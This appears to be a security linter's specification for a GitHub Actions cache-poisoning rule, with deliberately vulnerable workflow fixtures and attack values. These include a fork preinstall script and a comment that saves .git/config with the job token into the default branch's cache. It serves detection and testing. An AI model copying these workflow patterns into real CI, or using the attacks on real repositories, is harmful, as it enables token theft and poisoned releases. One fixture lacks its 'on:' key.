- <https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching#cache-key-matching>

## cache-poisoning

- problem: a job that an attacker's event runs, which no one approves, has a cache-mode that saves to the cache of the default branch's scope: what the attacker saves there, through a flaw that runs their code or by the job's own steps, later runs of the repository restore and run
- expected: a job of an attacker's event whose cache-mode is read or none, or that has no cache-mode, which GitHub reads as read on such an event (on workflow_dispatch, a job with no cache-mode saves); the cache saved by a workflow whose key, path and checkout no attacker decides: a workflow that the attacker does not trigger, or a workflow on workflow_dispatch whose key, path and ref of the checkout no input of workflow_dispatch decides
- severity: high (the worst of its kinds)
- targets: workflow
- facets:
  - weakness: excessive-privilege, untrusted-code-execution
  - attack-means: none, code, string
- default run: always: in a run without --rule, the rule runs unless --skip-rule names the rule

### finding kinds

- cache-poisoning.writable-job
  - detected: the job runs on {cache_write_on}, which an attacker triggers, with no approval, and cache-mode {cache_mode} lets it save to the cache of the default branch's scope
  - arguments:
    - {cache_write_on}: The privileged events on which the job may save to the cache, each event named once.
    - {cache_mode}: The cache-mode that lets the job save to the cache, as written.
  - consequence: a flaw that runs the attacker's code in the job, such as an injection or a checkout of their code, lets them save to the cache what later runs of the repository restore and run, a release among them
  - remedy: make the cache-mode read or none, and save the cache from a workflow the attacker does not trigger, such as one on push
  - severity: high (found from the CVSS metrics below by the table)
  - fix kinds: cache-mode-no-write
  - fact kinds: repo.environment-protected (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting)
  - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks
  - preconditions: privileged-job, no-approval, cache-writes, flaw-in-job, restored-later, app-status-check, callers-events
  - incidents: tanstack-2026
  - true positives:
    - .github/workflows/labeled.yml (workflow, true-positive)
      ```yaml
      # situation: labeler.yml runs actions/labeler on pull_request_target with a
      #   personal access token; the configuration .github/labeler.yml adds the
      #   label safe-to-test to a pull request that changes a file under site/;
      #   labeled.yml runs on pull_request_target on labeled when the label is
      #   safe-to-test, and the job has cache-mode write, checks out the head of the
      #   pull request and runs npm ci.
      # reason: the attacker chooses the files that the pull request changes, which
      #   actions/labeler reads, and a label that a personal access token adds
      #   starts the labeled run, so no person approves the run before the label
      #   starts the run.
      # attack-value: the file package.json in the pull request's head = "{\"scripts\":{\"preinstall\":\"mkdir -p ~/.npm && echo PWNED > ~/.npm/PWNED\"}}"
      # attack-run-behavior: the attacker opens a pull request from a fork that
      #   changes a file under site/ and the files of the attack; actions/labeler
      #   adds the label safe-to-test, which starts labeled.yml, and npm ci runs the
      #   preinstall script of the pull request in a job that may save to the cache
      #   of the scope of the default branch, so the code of the attacker can save
      #   an entry there.
      on:
        pull_request_target:
          types: [labeled]
      jobs:
        build:
          if: github.event.label.name == 'safe-to-test'
          runs-on: ubuntu-latest
          cache-mode: write
          steps:
            - uses: actions/checkout@v4.2.2
              with:
                ref: ${{ github.event.pull_request.head.sha }}
            - run: npm ci
      ```
      - finding on: .github/workflows/labeled.yml
      - .github/labeler.yml (repo-file)
        ```yaml
        safe-to-test:
          - changed-files:
              - any-glob-to-any-file: 'site/**'
        ```
      - .github/workflows/labeler.yml (workflow)
        ```yaml
        on: pull_request_target
        permissions: {}
        jobs:
          label:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/labeler@v5
                with:
                  repo-token: ${{ secrets.LABELER_PAT }}
        ```
    - .github/workflows/labeled.yml (workflow, true-positive)
      ```yaml
      # situation: labeler.yml runs, on pull_request_target,
      #   actions/checkout@v4 of the head of the pull request, which the guard of
      #   actions/checkout stops, and then actions/labeler with if: always() and a
      #   personal access token; the configuration .github/labeler.yml adds the
      #   label safe-to-test to a pull request that changes a file under site/;
      #   labeled.yml runs on pull_request_target on labeled when the label is
      #   safe-to-test, and the job has cache-mode write, checks out the head of the
      #   pull request and runs npm ci.
      # reason: actions/labeler runs after the checkout fails, because of
      #   always(), on the pull request of the attacker, and a label that the
      #   token adds starts the labeled run, so no person approves the run before
      #   the label starts the run.
      # attack-value: the file package.json in the pull request's head = "{\"scripts\":{\"preinstall\":\"mkdir -p ~/.npm && echo PWNED > ~/.npm/PWNED\"}}"
      # attack-run-behavior: the attacker opens a pull request from a fork that
      #   changes a file under site/ and the files of the attack; actions/labeler
      #   adds the label safe-to-test, which starts labeled.yml, and npm ci runs the
      #   preinstall script of the pull request in a job that may save to the cache
      #   of the scope of the default branch, so the code of the attacker can save
      #   an entry there.
      on:
        pull_request_target:
          types: [labeled]
      jobs:
        build:
          if: github.event.label.name == 'safe-to-test'
          runs-on: ubuntu-latest
          cache-mode: write
          steps:
            - uses: actions/checkout@v4.2.2
              with:
                ref: ${{ github.event.pull_request.head.sha }}
            - run: npm ci
      ```
      - finding on: .github/workflows/labeled.yml
      - .github/labeler.yml (repo-file)
        ```yaml
        safe-to-test:
          - changed-files:
              - any-glob-to-any-file: 'site/**'
        ```
      - .github/workflows/labeler.yml (workflow)
        ```yaml
        on: pull_request_target
        permissions: {}
        jobs:
          label:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@v4
                with:
                  ref: ${{ github.event.pull_request.head.sha }}
              - uses: actions/labeler@v5
                if: always()
                with:
                  repo-token: ${{ secrets.LABELER_PAT }}
        ```
    - writable-job.remote-callee.yml (workflow, true-positive)
      ```yaml
      # situation: a job calls the reusable workflow .github/workflows/w.yml of
      #   the repository example-org/cache-poisoning-remote, which the fact
      #   workflow.definition answers with the workflow of the true positive
      #   writable-job (writable-job.tanstack.yml) of the rule, with on:
      #   workflow_call in place of the on of writable-job.tanstack.yml. The job
      #   passes its secrets with secrets: inherit. In the true positive, the
      #   bundle-size workflow of the TanStack incident (2026-05-11) with
      #   cache-mode: write: pull_request_target checks out the merge of the pull
      #   request, a composite action of another repository sets up pnpm with
      #   actions/cache, and a build runs the pull request's code.
      # reason: the jobs of a reusable workflow run on the event that started the
      #   run of the calling job, so the reason of the true positive holds:
      #   cache-mode: write lets the job save to the cache of the default branch's
      #   scope on pull_request_target; the build runs the author's code, which
      #   changes the pnpm store that the post step of actions/cache saves under
      #   the key the release workflow looks up.
      # attack-value: the file packages/history/vite_setup.mjs in the pull request = "console.log('PWNED')"
      # attack-run-behavior: the checkout fetches refs/pull/<n>/merge, the build
      #   runs the pull request's code, which writes into the pnpm store; at the
      #   end of the job actions/cache saves the store to the default branch's
      #   scope, and the release workflow restores it and runs it.
      on:
        pull_request_target:
          paths: ['packages/**']
      permissions:
        contents: read
      jobs:
        c:
          uses: example-org/cache-poisoning-remote/.github/workflows/w.yml@v1
          secrets: inherit
      ```
    - writable-job.tanstack.yml (workflow, true-positive)
      ```yaml
      # situation: the bundle-size workflow of the TanStack incident (2026-05-11)
      #   with cache-mode: write: pull_request_target checks out the merge of the
      #   pull request, a composite action of another repository sets up pnpm
      #   with actions/cache, and a build runs the pull request's code.
      # reason: cache-mode: write lets the job save to the cache of the default
      #   branch's scope on pull_request_target; the build runs the author's
      #   code, which changes the pnpm store that the post step of actions/cache
      #   saves under the key the release workflow looks up.
      # attack-value: the file packages/history/vite_setup.mjs in the pull request = "console.log('PWNED')"
      # attack-run-behavior: the checkout fetches refs/pull/<n>/merge, the build
      #   runs the pull request's code, which writes into the pnpm store; at the
      #   end of the job actions/cache saves the store to the default branch's
      #   scope, and the release workflow restores it and runs it.

        pull_request_target:
          paths: ['packages/**']
      permissions:
        contents: read
      jobs:
        benchmark-pr:
          runs-on: ubuntu-latest
          cache-mode: write
          steps:
            - uses: actions/checkout@v6.0.2
              with:
                ref: refs/pull/${{ github.event.pull_request.number }}/merge
            - uses: TanStack/config/.github/setup@main
            - run: pnpm nx run @benchmarks/bundle-size:build
      ```

      ```yaml
      # situation: on pull_request_target, a job with cache-mode: write checks
      #   out the base and saves node_modules to the cache.
      # reason: pull_request_target runs the job for a pull request from a fork
      #   with no approval, and cache-mode: write lets it save to the cache of
      #   the default branch's scope, which GitHub otherwise keeps read-only on
      #   that event: a flaw that runs the author's code in the job lets them
      #   save what later runs restore.
      # attack: a flaw of the job (a later change that checks out the pull
      #   request's code, or an injection) runs the attacker's code, which saves
      #   an entry under the key of the release workflow.
      # attack-run-behavior: the job runs with Cache mode: write; code run in it
      #   saves to the default branch's scope, and the next run that restores
      #   that key runs what the attacker put there.
      on: pull_request_target
      jobs:
        a:
          runs-on: ubuntu-latest
          cache-mode: write
          steps:
            - uses: actions/checkout@v4
            - uses: actions/cache@v4
              with:
                path: node_modules
                key: deps-${{ hashFiles('package-lock.json') }}
            - run: npm ci
      ```

- cache-poisoning.saved-checkout
  - detected: {uses} checks out {checkout_ref} on {cache_write_on}, and {save} saves {path} to the cache of the default branch's scope
  - arguments:
    - {uses}: The uses of the checkout, as written.
    - {checkout_ref}: The reference that names the pull request's code, as written.
    - {cache_write_on}: The privileged events on which the finding holds, each event named once.
    - {save}: The step that saves the path to the cache: the name of the step, or steps&#91;&lt;n>] when the step has no name, with n counted from 0 among all the steps of the job or of the action. For a step of a composite action that a step of the job runs, the name of the step, then of, then the uses of the composite action as written.
    - {path}: One line of the input path of the cache step (the input may have several lines), the line that names the checked out code, as written.
  - consequence: the pull request's author puts their files in a cache that later runs of the repository restore and run, with no code of theirs run in the job
  - remedy: check out the base's code, save to the cache only what the job builds from it, or make the cache-mode read or none
  - severity: high (found from the CVSS metrics below by the table)
  - fact kinds: repo.environment-protected (provider: repo-setting), git.commit-contains (provider: github), repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting)
  - attackers: fork-pr-author, commenter
  - preconditions: privileged-job, no-approval, cache-writes, pr-tree, no-guard, saves-tree, restored-later, app-status-check, callers-events
  - true positives:
    - .github/workflows/composite-caller.yml (workflow, true-positive)
      ```yaml
      # situation: on issue_comment, a job with cache-mode: write checks out the
      #   head of the pull request the comment is on, and then runs a composite
      #   action of the repository whose step (actions/cache/save) saves dist.
      # reason: $/ names the action at the commit of the workflow, an input of the
      #   run; its step saves to the cache as a step of the job does.
      # attack-value: the file dist/index.js in the pull request's head = "console.log('PWNED')"
      # attack-run-behavior: the step of the composite action saves dist, with the
      #   attacker's index.js, to the default branch's scope.
      on: issue_comment
      jobs:
        a:
          runs-on: ubuntu-latest
          cache-mode: write
          steps:
            - uses: actions/checkout@v4
              with:
                ref: refs/pull/${{ github.event.issue.number }}/head
            - uses: $/.github/actions/save
      ```
      - finding on: .github/workflows/composite-caller.yml
      - .github/actions/save/action.yml (action-metadata)
        ```yaml
        runs:
          using: composite
          steps:
            - uses: actions/cache/save@v4
              with:
                key: dist-${{ github.sha }}
                path: dist
        ```

- cache-poisoning.attacker-key
  - detected: {uses} saves to the cache of the default branch's scope on {cache_write_on} under a key with {expression}, which an attacker writes
  - arguments:
    - {uses}: The uses of the step, as written.
    - {cache_write_on}: The privileged events on which an attacker writes the value of the expression, each event named once.
    - {expression}: The reference in the key, as written.
  - consequence: the attacker chooses the key, and saves first under one that later runs of the repository look up
  - remedy: make the key of values the attacker does not write, or make the cache-mode read or none
  - severity: high (found from the CVSS metrics below by the table)
  - fact kinds: repo.environment-protected (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
  - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks, merged-commit-author
  - preconditions: privileged-job, no-approval, cache-writes, attacker-cache-input, restored-later, app-status-check, callers-events
  - true positives:
    - .github/workflows/called.yml (workflow, true-positive)
      ```yaml
      # situation: a reusable workflow that writes no cache-mode saves build under
      #   a key that has the title of the pull request; ci.yml calls it on
      #   pull_request_target with cache-mode: write.
      # reason: a called workflow that writes no cache-mode runs with its
      #   caller's, so the save of the pull_request_target run goes to the
      #   default branch's scope, under the key the pull request's author writes
      #   in the title.
      # attack-value: github.event.pull_request.title = "deps-Linux-5f4dcc3b5aa765d61d8327deb882cf99"
      # attack-run-behavior: the pull request starts ci.yml, which calls this
      #   workflow with Cache mode: write; the step saves build under the title,
      #   which a later run that computes that key restores.
      on: workflow_call
      jobs:
        j:
          runs-on: ubuntu-latest
          steps:
            - run: make
            - uses: actions/cache/save@v4
              with:
                path: build
                key: ${{ github.event.pull_request.title }}
      ```
      - finding on: .github/workflows/called.yml
      - .github/workflows/ci.yml (workflow)
        ```yaml
        on: pull_request_target
        jobs:
          c:
            cache-mode: write
            uses: ./.github/workflows/called.yml
        ```

- cache-poisoning.attacker-path
  - detected: {uses} saves to the cache of the default branch's scope on {cache_write_on} the path {expression}, which an attacker writes
  - arguments:
    - {uses}: The uses of the step, as written.
    - {cache_write_on}: The privileged events on which an attacker writes the value of the expression, each event named once.
    - {expression}: The reference in the path, as written.
  - consequence: the attacker chooses the files saved, such as the credential a checkout leaves in .git, and anyone who can open a pull request reads the caches of the default branch
  - remedy: make the path of values the attacker does not write, or make the cache-mode read or none
  - severity: high (found from the CVSS metrics below by the table)
  - fact kinds: repo.environment-protected (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
  - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks, merged-commit-author
  - preconditions: privileged-job, no-approval, cache-writes, attacker-cache-input, app-status-check, callers-events
  - true positives:
    - attacker-path.yml (workflow, true-positive)
      ```yaml
      # situation: on issue_comment, a job with cache-mode: write checks out the
      #   base, and saves with actions/cache/save the path the comment's body
      #   names.
      # reason: cache-mode: write lets the job save to the cache of the default
      #   branch's scope, and the commenter chooses the files saved: the
      #   credential the checkout leaves in .git/config among them; anyone who
      #   can open a pull request reads the caches of the default branch.
      # attack-value: github.event.comment.body = ".git/config"
      # attack-run-behavior: the comment starts the job; the checkout writes the
      #   job's token into .git/config, the save puts .git/config in the cache of
      #   the default branch's scope, and a pull_request run of the attacker's
      #   restores it and prints the token while the job runs.
      on: issue_comment
      jobs:
        a:
          runs-on: ubuntu-latest
          cache-mode: write
          steps:
            - uses: actions/checkout@v4
            - uses: actions/cache/save@v4
              with:
                path: ${{ github.event.comment.body }}
                key: saved-${{ github.run_id }}
      ```
  - true negatives:
    - attacker-path.yml (workflow, true-negative)
      ```yaml
      # situation: on issue_comment, a job with cache-mode: read checks out the
      #   base, and saves with actions/cache/save the path the comment's body
      #   names.
      # reason: with cache-mode read nothing is saved to the cache of the default
      #   branch's scope: the files the commenter chooses stay in the job.
      # attack-value: github.event.comment.body = ".git/config"
      # attack-run-behavior: the comment starts the job; the save of .git/config
      #   is denied, and logs that the token has no writable scopes.
      on: issue_comment
      jobs:
        a:
          runs-on: ubuntu-latest
          cache-mode: read
          steps:
            - uses: actions/checkout@v4
            - uses: actions/cache/save@v4
              with:
                path: ${{ github.event.comment.body }}
                key: saved-${{ github.run_id }}
      ```

### fix kinds

- cache-mode-no-write: save nothing to the cache on the attacker's events: cache-mode read (or none for write-only)
  - safety: review
  - possible side effects:
    - cache-not-saved: The job no longer saves to the cache; later runs that restore what it saved miss, until a trusted workflow saves it.

### undetected forms

- merged-commit-push: a value that the author of a merged commit writes, such as the message of the head commit of a push (github.event.head_commit.message), in a run of push or merge_group: the message of a commit that merges a pull request can have the title of the pull request, which the author of the pull request writes; the rule reads the author of a merged commit only in a run of status, check_suite or check_run
  - finding kinds: cache-poisoning.attacker-key, cache-poisoning.attacker-path
  - disposition: todo (needs: same-file)
  - example: merged-commit-push.yml (workflow, undetected)
    ```yaml
    # situation: on push, the job writes the message of the head commit of the
    #   push (github.event.head_commit.message) into the key of a cache that the
    #   job saves.
    # reason: a todo (the same file): when one who can write merges a pull
    #   request into the default branch, the message of the commit that merges
    #   the pull request can have the title of the pull request, which the
    #   author of the pull request writes, and the push of the merge starts a
    #   run of push on the default branch, whose saves reach the scope of the
    #   default branch.
    # cause: the rule reads the author of a merged commit only on status,
    #   check_suite and check_run, not on push or merge_group.
    # attack-value: github.event.head_commit.message = "main"
    # attack-run-behavior: the author of a pull request writes the value as the
    #   title of the pull request; one who can write merges the pull request
    #   with the title as the message of the commit, the run of push saves the
    #   cache under the key build-main, and a job on the default branch restores
    #   the cache.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/cache/save@v4
            with:
              path: build
              key: build-${{ github.event.head_commit.message }}
    ```
- restore-keys: restore-keys with a value an attacker writes: it chooses what is restored among the entries of the default branch's scope, which only the repository's runs or another flaw save; it saves nothing
  - finding kinds: cache-poisoning.writable-job, cache-poisoning.saved-checkout, cache-poisoning.attacker-key, cache-poisoning.attacker-path
  - disposition: no-added-gain
  - example: restore-keys.yml (workflow, undetected)
    ```yaml
    # situation: on issue_comment, a job restores build from a restore key that
    #   has the comment's body.
    # reason: no added gain: restore-keys chooses what is restored among the
    #   entries of the default branch's scope, which the repository's runs save,
    #   or another flaw that the rule reports where it saves; it saves nothing.
    # cause: the rule reads the key and the path of a step that saves, not
    #   restore-keys.
    # attack-value: github.event.comment.body = "deps-"
    # attack-run-behavior: the comment starts the job, which restores the newest
    #   entry whose key starts with deps-, an entry the repository's runs saved.
    on: issue_comment
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/cache/restore@v4
            with:
              path: build
              key: build-${{ github.sha }}
              restore-keys: ${{ github.event.comment.body }}
    ```
- remote-composite-unanswered: a step of a composite action of another repository, run after a checkout of the pull request's code, that saves the checked out tree to the cache, when action.definition has no answer and the run did not ask GitHub (a run without --online and without the answer in --facts): the rule does not read the action; on the job the rule reports writable-job, not saved-checkout
  - finding kinds: cache-poisoning.saved-checkout
  - disposition: todo (needs: fact)
  - example: remote-composite-unanswered.yml (workflow, undetected)
    ```yaml
    # situation: after a checkout of the pull request's head, a job with
    #   cache-mode: write runs a composite action of another repository whose
    #   step saves dist to the cache; the run has no answer of
    #   action.definition for the action, and no one was asked (no --online,
    #   no answer in --facts).
    # reason: the step of the composite action saves the pull request's dist
    #   to the default branch's scope, as in the true positive
    #   saved-checkout.remote-composite.
    # cause: the rule reads the steps of an action of another repository only
    #   from the answer of action.definition, which the run does not have. On
    #   the job the rule reports writable-job, whose condition is a flaw that
    #   runs the attacker's code; the step saves the tree with no such flaw.
    # attack-value: the file dist/index.js in the pull request's head = "console.log('PWNED')"
    # attack-run-behavior: the step of example-org/unasked-composite saves dist,
    #   with the attacker's index.js, to the default branch's scope.
    on: issue_comment
    jobs:
      a:
        runs-on: ubuntu-latest
        cache-mode: write
        steps:
          - uses: actions/checkout@v4
            with:
              ref: refs/pull/${{ github.event.issue.number }}/head
          - uses: example-org/unasked-composite@v1
    ```
- default-cache: a job with no cache-mode that runs on one of the events of an attacker that the rule reads (pull_request_target, workflow_run, issue_comment, issues, discussion, discussion_comment, fork, status, check_suite, check_run): GitHub gives a run of an event other than push, workflow_dispatch, repository_dispatch, delete, registry_package, page_build and schedule read access only to the cache of the default branch's scope, so GitHub denies the save of actions/cache without failing the step
  - finding kinds: cache-poisoning.writable-job, cache-poisoning.saved-checkout, cache-poisoning.attacker-key, cache-poisoning.attacker-path
  - disposition: no-added-gain
  - example: default-cache.yml (workflow, undetected)
    ```yaml
    # situation: on pull_request_target, a job with no cache-mode checks out the
    #   head of the pull request, and actions/cache saves dist, a directory of
    #   the tree.
    # reason: no added gain: with no cache-mode GitHub gives the run read
    #   access only to the cache of the default branch's scope, and the save is
    #   denied without failing the step.
    # cause: the job writes no cache-mode, which the rule reads as no save on the
    #   attacker's events.
    # attack-value: the file dist/index.js in the pull request's head = "console.log('PWNED')"
    # attack-run-behavior: the checkout fetches the head, and the post step of
    #   actions/cache logs that saving is denied (token has no writable scopes).
    on: pull_request_target
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
            with:
              ref: ${{ github.event.pull_request.head.sha }}
              allow-unsafe-pr-checkout: true
          - uses: actions/cache@v4
            with:
              path: dist
              key: dist-${{ hashFiles('package-lock.json') }}
    ```
- review-event: a job with cache-mode write or write-only that runs on pull_request_review or pull_request_review_comment: the rule reads the caches of a run of a review as saved to the merge ref of the pull request (refs/pull/&lt;n>/merge), not to the scope of the default branch, as GitHub's documentation says of the caches of a run on a pull request; the authors of the linter saw no run of a review save a cache, and did not see whether a later run of the pull request, which has the secrets of the repository, restores such a cache
  - finding kinds: cache-poisoning.writable-job, cache-poisoning.saved-checkout, cache-poisoning.attacker-key, cache-poisoning.attacker-path
  - disposition: todo (needs: same-file, fact)
  - example: review-event.yml (workflow, undetected)
    ```yaml
    # situation: on pull_request_review, a job with cache-mode: write saves
    #   build under a key that has the review's body.
    # reason: a todo (the same file, a fact): anyone who may comment reviews a
    #   pull request from a branch of the repository, and the job saves a cache
    #   under the key the attacker wrote; the scope of a cache that a run of a
    #   review saves was not seen, and the rule reads it as the merge ref of
    #   the pull request, not the scope of the default branch.
    # cause: the rule does not read pull_request_review among the events whose
    #   run saves a cache to the scope of the default branch.
    # attack-value: github.event.review.body = "deps-Linux-5f4dcc3b5aa765d61d8327deb882cf99"
    # attack-run-behavior: the attacker reviews an open pull request whose
    #   branch is in the repository; the job saves build under the key they
    #   wrote.
    on: pull_request_review
    jobs:
      a:
        runs-on: ubuntu-latest
        cache-mode: write
        steps:
          - run: make
          - uses: actions/cache/save@v4
            with:
              path: build
              key: ${{ github.event.review.body }}
    ```
- repository-dispatch: a value of the client_payload of repository_dispatch (github.event.client_payload): only a credential with write access to the permission Contents of the repository can send repository_dispatch, and the credential premise assumes that no attacker holds such a credential; the sender chooses the whole client_payload
  - finding kinds: cache-poisoning.writable-job, cache-poisoning.saved-checkout, cache-poisoning.attacker-key, cache-poisoning.attacker-path
  - disposition: no-added-gain
  - example: repository-dispatch.yml (workflow, undetected)
    ```yaml
    # situation: on repository_dispatch, a job with no cache-mode saves build
    #   with actions/cache/save under a key that has the value key of the
    #   client_payload.
    # reason: the form adds nothing to what the attacker gets (the disposition
    #   no-added-gain): only a credential with write access to the permission
    #   Contents of the repository can send repository_dispatch, and the
    #   credential premise assumes that no attacker holds such a credential; the
    #   sender chooses the whole client_payload.
    # cause: the table of the attacker's events that the rule reads leaves out
    #   repository_dispatch on purpose: the credential premise leaves the sender
    #   of repository_dispatch out of the threat model.
    # attack-value: github.event.client_payload.key = "deps-Linux-5f4dcc3b5aa765d61d8327deb882cf99"
    # attack-run-behavior: when a repository_dispatch with the value in its
    #   client_payload runs the workflow, a run of repository_dispatch saves to
    #   the cache with no cache-mode, and the job saves build to the cache of the
    #   default branch's scope under build-<value>, a key that the sender of the
    #   repository_dispatch chose.
    on: repository_dispatch
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/cache/save@v4
            with:
              path: build
              key: build-${{ github.event.client_payload.key }}
    ```
- deployment-status: a value of the payload of deployment_status, such as the SHA of the deployment (deployment.sha), when an app outside GitHub Actions makes a deployment and a status of the deployment for a commit of a pull request from a fork: no run of deployment_status started when the authors of the linter tried this, and why the run did not start was not found; the rule does not read deployment_status as an event that an attacker starts
  - finding kinds: cache-poisoning.writable-job, cache-poisoning.saved-checkout, cache-poisoning.attacker-key, cache-poisoning.attacker-path
  - disposition: todo (needs: fact)
  - example: deployment-status.yml (workflow, undetected)
    ```yaml
    # situation: on deployment_status, which an app outside GitHub Actions
    #   starts when the app makes a status of a deployment, the job writes the
    #   description of the deployment (github.event.deployment.description)
    #   where the rule reads it.
    # reason: a todo (a fact): no run of deployment_status started when a GitHub
    #   App made a deployment and a status of the deployment for a commit of a
    #   pull request from a fork (seen on GitHub), and why the run did not start
    #   was not found.
    # cause: the table of the attacker's events that the rule reads does not
    #   have deployment_status.
    # attack-value: github.event.deployment.description = "main"
    # attack-run-behavior: an outside app makes a deployment for the commit of
    #   the pull request from a fork with a description that the pull request
    #   gives; if a run of deployment_status starts on the default branch, the
    #   job saves the cache under the key build-main, which a job on the default
    #   branch restores.
    on: deployment_status
    jobs:
      j:
        runs-on: ubuntu-latest
        cache-mode: write
        steps:
          - uses: actions/cache/save@v4
            with:
              path: build
              key: build-${{ github.event.deployment.description }}
    ```
- dispatch-relay: a workflow on an event of an attacker that puts a value the attacker writes into the client_payload of a repository_dispatch that the workflow sends (gh api with client_payload to the endpoint dispatches, peter-evans/repository-dispatch), and a workflow on repository_dispatch that uses the value: the flaw is in the workflow that sends the repository_dispatch, and the rule does not read what a workflow sends to another workflow
  - finding kinds: cache-poisoning.writable-job, cache-poisoning.saved-checkout, cache-poisoning.attacker-key, cache-poisoning.attacker-path
  - disposition: todo (needs: repo-file)
  - example: .github/workflows/receiver.yml (workflow, undetected)
    ```yaml
    # situation: sender.yml runs on issues opened, and with the GITHUB_TOKEN
    #   sends a repository_dispatch of the type relay whose client_payload has the
    #   title of the issue as the value key; receiver.yml runs on that
    #   repository_dispatch, and a job with no cache-mode saves build with
    #   actions/cache/save under a key that has the value key of the
    #   client_payload.
    # reason: the author of the issue writes the value, and sender.yml relays
    #   the value to receiver.yml in a repository_dispatch that a run of the
    #   repository sends with a token of the repository; GitHub creates a workflow
    #   run for a repository_dispatch sent with the GITHUB_TOKEN, as an exception
    #   to the rule that an event that the GITHUB_TOKEN triggers creates no
    #   workflow run.
    # cause: the rule reads the events of each workflow alone, and does not read
    #   what a workflow sends to another workflow as the client_payload of a
    #   repository_dispatch.
    # attack-value: github.event.issue.title = "deps-Linux-5f4dcc3b5aa765d61d8327deb882cf99"
    # attack-run-behavior: the attacker opens an issue whose title is the value;
    #   sender.yml sends the value, and in the run of receiver.yml a run of
    #   repository_dispatch saves to the cache with no cache-mode, and the job
    #   saves build to the cache of the default branch's scope under
    #   build-<value>, a key that the sender of the repository_dispatch chose.
    on:
      repository_dispatch:
        types: [relay]
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/cache/save@v4
            with:
              path: build
              key: build-${{ github.event.client_payload.key }}
    ```
    - .github/workflows/sender.yml (workflow)
      ```yaml
      on:
        issues:
          types: [opened]
      permissions:
        contents: write
      jobs:
        relay:
          runs-on: ubuntu-latest
          steps:
            - env:
                GH_TOKEN: ${{ github.token }}
                VALUE: ${{ github.event.issue.title }}
              run: gh api "repos/$GITHUB_REPOSITORY/dispatches" -f event_type=relay -f "client_payload[key]=$VALUE"
      ```
- dispatch-input-call: an input of workflow_dispatch that a caller of the same repository passes, as an input of the call (under the key with: of the calling job or step), to a reusable workflow or a composite action, which uses the input as a value: the one who dispatches the caller chooses the value, and the rule reads the events of a called workflow or action from the table of the callers, and does not follow the value of an input of workflow_dispatch that the caller gives
  - finding kinds: cache-poisoning.writable-job, cache-poisoning.saved-checkout, cache-poisoning.attacker-key, cache-poisoning.attacker-path
  - disposition: todo (needs: repo-file)
  - example: .github/workflows/called.yml (workflow, undetected)
    ```yaml
    # situation: caller.yml runs on workflow_dispatch with the input x, and
    #   calls called.yml with the input x of the dispatch as the input x of
    #   called.yml; called.yml saves build with actions/cache/save under a key
    #   that has the input x.
    # reason: the one who dispatches caller.yml chooses the value:
    #   input-dispatch reports such a value where a workflow on workflow_dispatch
    #   refers to its input directly, but through the call the value is the input
    #   x of called.yml.
    # cause: the rule reads the events of a called workflow from the table of
    #   the callers, and does not follow the value of an input of
    #   workflow_dispatch that a caller gives in with.
    # attack-value: inputs.x = "deps-Linux-5f4dcc3b5aa765d61d8327deb882cf99"
    # attack-run-behavior: when the one who dispatches caller.yml gives the
    #   value as x, the job saves build to the cache of the scope of the ref of
    #   the run under build-<value>, a key that the one who dispatches the
    #   workflow chose.
    on:
      workflow_call:
        inputs:
          x: {type: string}
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/cache/save@v4
            with:
              path: build
              key: build-${{ inputs.x }}
    ```
    - .github/workflows/caller.yml (workflow)
      ```yaml
      on:
        workflow_dispatch:
          inputs:
            x: {type: string}
      jobs:
        call:
          uses: ./.github/workflows/called.yml
          with:
            x: ${{ inputs.x }}
          secrets: inherit
      ```
- dispatch-derived: a value that an env or the output of a step makes from an input of workflow_dispatch, in a job that runs only on workflow_dispatch (env: REF: refs/pull/\${{ inputs.pr }}/head; the output of gh pr view with the input pr), used as the ref of a checkout, the run that a download takes (the input run-id of actions/download-artifact), the key or the path of the cache, or a prompt: the one who dispatches the workflow chooses the value too, and the rule reports only an input of workflow_dispatch that the value refers to directly (input-dispatch)
  - finding kinds: cache-poisoning.writable-job, cache-poisoning.saved-checkout, cache-poisoning.attacker-key, cache-poisoning.attacker-path
  - disposition: todo (needs: same-file)
  - example: dispatch-derived.yml (workflow, undetected)
    ```yaml
    # situation: on workflow_dispatch with the input pr, the step k writes
    #   build-<the input pr> to its output key, and actions/cache/save saves build
    #   under the key steps.k.outputs.key.
    # reason: the one who dispatches the workflow chooses the input, and the env
    #   or the output of a step makes the value from the input, so the one who
    #   dispatches the workflow chooses the value too.
    # cause: the rule reports an input of workflow_dispatch that a value refers
    #   to directly (input-dispatch), and does not follow a value that an env or
    #   the output of a step makes from the input in a job that runs only on
    #   workflow_dispatch.
    # attack-value: inputs.pr = "deps-Linux-5f4dcc3b5aa765d61d8327deb882cf99"
    # attack-run-behavior: when the one who dispatches the workflow gives the
    #   value, the job saves build to the cache of the scope of the ref of the run
    #   under build-<value>, a key that the one who dispatches the workflow chose.
    on:
      workflow_dispatch:
        inputs:
          pr: {type: string}
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - id: k
            env:
              V: ${{ inputs.pr }}
            run: echo "key=build-$V" >> "$GITHUB_OUTPUT"
          - uses: actions/cache/save@v4
            with:
              path: build
              key: ${{ steps.k.outputs.key }}
    ```
- npm-abbreviation: a command that runs npm followed by an abbreviation of the name of an npm command that runs code of the checked out tree (for example, npm tes for npm test), in a run step or in a permission of an agent. npm runs a word as an npm command when the word is the beginning of exactly one command name or alias name of the npm release that the job uses. The rule does not read abbreviations of npm command names.
